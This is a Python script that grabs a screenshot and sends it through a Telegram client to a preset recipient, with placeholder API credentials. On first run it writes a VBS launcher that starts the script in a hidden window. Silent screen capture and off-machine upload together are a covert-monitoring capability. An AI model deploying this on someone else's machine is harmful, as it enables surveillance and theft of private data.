import os
import pyautogui as gui
from datetime import datetime
import telebot
from telethon.sync import TelegramClient
from telethon.tl.types import InputPeerUser, InputPeerChannel
from telethon import TelegramClient

# ****************************************************************
#              INDIVIDUAL UNIQUE SECRET INFORMATION
# ****************************************************************

bot_api_token = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' # YOUR BOT API TOKEN

api_id = 1111111 # YOUR API ID

api_hash = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' # YOUR API HASH

phone = '+91XXXXXXXXXX' # YOUR PHONE NUMBER

SEND_TO = 'xxxxxxxxxx' # ID of the Recipient - (MUST BE PUBLIC)

# ****************************************************************
#              CREATING SETUP FILES (FIRST TIME ONLY)
# ****************************************************************

curr_dir = os.getcwd()
f_list = os.listdir(curr_dir)
if 'Screenshots' not in f_list:
    os.mkdir(curr_dir + '\\Screenshots')

if 'send.bat' not in f_list:
    with open(curr_dir + '\\send.bat', 'w') as fp:
        fp.write('python main.py')

if 'send.vbs' not in f_list:
    with open(curr_dir + '\\send.vbs', 'w') as fp:
        fp.write('''Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "send.bat" & Chr(34), 0
Set WshShell = Nothing''')

# ****************************************************************
#    TAKING SCREENSHOT AND SAVING INTO THE 'Screenshots' Folder
# ****************************************************************

ss = gui.screenshot()
PATH = curr_dir + '\\Screenshots\\'
f_name = str(datetime.now().timestamp()) + '_Screenshot.png'

f = PATH + f_name

ss.save(f)

# ****************************************************************
#    SETTING UP TELEGRAM CLIENT (FIRST TIME) AND SENDING IMAGE
# ****************************************************************

client = TelegramClient('session', api_id, api_hash)
client.connect()

if not client.is_user_authorized():
    client.send_code_request(phone)
    client.sign_in(phone,
                   input('Enter the code sent to your phone: '))

try:
    client.send_file(SEND_TO, f)
except Exception as e:
    print(e)

client.disconnect()
